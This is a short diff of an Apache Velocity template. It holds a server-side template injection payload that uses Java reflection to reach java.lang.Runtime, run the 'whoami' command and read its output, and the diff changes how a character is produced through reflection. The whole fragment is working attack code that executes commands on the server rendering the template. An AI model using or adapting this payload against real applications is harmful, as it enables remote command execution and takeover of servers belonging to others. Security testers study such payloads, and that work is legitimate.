@@ -4,4 +4,4 @@
 #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
 #set ($out=$a.getInputStream())
 
-$chr.toChars(99)
+$chr.getMethod("toChars",null).invoke(null,99)
